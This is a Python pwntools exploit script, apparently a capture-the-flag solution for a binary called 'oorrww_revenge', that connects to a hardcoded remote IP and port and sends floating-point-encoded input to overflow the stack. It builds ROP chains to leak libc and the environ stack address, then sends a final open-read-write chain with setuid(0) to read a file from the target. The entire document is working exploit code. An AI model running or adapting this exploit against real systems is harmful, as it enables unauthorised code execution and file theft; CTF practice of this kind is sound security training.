#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./oorrww_revenge_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

REMOTE_NC_CMD    = "nc 193.148.168.30 7667"

#REMOTE_NC_CMD    = "nc localhost 9998"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *main+185
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def from_double(v):
    return u64(struct.pack("<d", v))

def to_double(v):
    return struct.unpack("<d", p64(v))[0]

def main():
    r = conn()

    ru  = lambda *x, **y: r.recvuntil(*x, **y)
    rl  = lambda *x, **y: r.recvline(*x, **y)
    rc  = lambda *x, **y: r.recv(*x, **y)
    sla = lambda *x, **y: r.sendlineafter(*x, **y)
    sa  = lambda *x, **y: r.sendafter(*x, **y)
    sl  = lambda *x, **y: r.sendline(*x, **y)
    sn  = lambda *x, **y: r.send(*x, **y)

    var = f"{to_double(0xdeadbeef):.16g}"
    var2 = f"{to_double(0x0405018):.16g}"

    RET = 0x000000000040101a
    POP_RAX_RET = 0x0000000000401203
    MOV_RDI_RAX_ECC = 0x00000000004012da
    PUTS_GOT = exe.got['puts']
    PUTS_PLT = exe.sym.puts
    POP_RBP_RET = 0x00000000004011dd
    LEAVE_RET = 0x00000000004012c9

    for i in range(19):
	    sl(str(var).encode())
    sl(b"+")
    sl(str(var).encode())

    # here 21
    sl(str(f"{to_double(POP_RAX_RET):.16g}").encode()) 
    sl(str(f"{to_double(PUTS_GOT):.16g}").encode()) 
    sl(str(f"{to_double(MOV_RDI_RAX_ECC):.16g}").encode()) 
    sl(str(f"{to_double(0x7ffff7e17600):.16g}").encode()) 
    sl(str(f"{to_double(PUTS_PLT):.16g}").encode()) 
    sl(str(f"{to_double(RET):.16g}").encode()) 
    sl(str(f"{to_double(PUTS_PLT):.16g}").encode()) 
    sl(str(f"{to_double(exe.sym.main):.16g}").encode())
    sl(str(var).encode())
    sl(str(var).encode())

    ru(b"P")
    leak_libc =b"P" + rl(False).strip()
    leak_libc = u64(leak_libc.ljust(8, b"\x00")) 
    libc.address = leak_libc - 0x80e50
    print(hex(libc.address))
    success(f"LEAK LIBC: {hex(libc.address)}")

    ENVIRON = libc.sym.environ

    #--------------SECOND STAGE----------------
    for i in range(18):
    	sl(str(var).encode())
    sl(b"+")
    sl(str(var).encode())
    # here 20
    sl(str(f"{to_double(POP_RAX_RET):.16g}").encode()) 
    sl(str(f"{to_double(ENVIRON):.16g}").encode()) 
    sl(str(f"{to_double(MOV_RDI_RAX_ECC):.16g}").encode()) 
    sl(str(f"{to_double(0x7ffff7e17600):.16g}").encode()) 
    sl(str(f"{to_double(PUTS_PLT):.16g}").encode()) 
    sl(str(f"{to_double(RET):.16g}").encode()) 
    sl(str(f"{to_double(PUTS_PLT):.16g}").encode()) 
    sl(str(f"{to_double(exe.sym.main):.16g}").encode())
    sl(str(var).encode())
    for i in range(33):
    	rl()

    leak_environ = rl(False).strip()
    leak_environ = u64(leak_environ.ljust(8, b"\x00")) 
    RBP = leak_environ -0xa8 
    success(f"ENVIRON : {hex(leak_environ)}")
    success(f"BASE POINTER: {hex(RBP)}")

    rop = ROP(libc)

    sl(b"-")
    sl(b"-")
    sl(b'1.1205295609968026e+253')
    sl(str(f"{to_double(0):.16g}").encode()) 
    for i in range(16):
        sl(b"-")
    sl(str(f"{to_double(0x41414141):.16g}").encode()) 
    
    read = [rop.rdi.address , 0 , rop.rsi.address , leak_environ-96 , rop.rdx.address , 2000 , (2000),  (libc.sym.read)]
    #gdb.attach(r)
    for i in read:
        sl(str(f"{to_double(i):.16g}").encode()) 
    sl(b"-")

    rop.setuid(0)
    rop.open(leak_environ-8*28-88, 0, 0)
    rop.read(3, leak_environ, 50)
    rop.write(1, leak_environ, 50)

    sleep(0.1)
    r.send(rop.chain())
    

    r.interactive()

if __name__ == "__main__":
    main()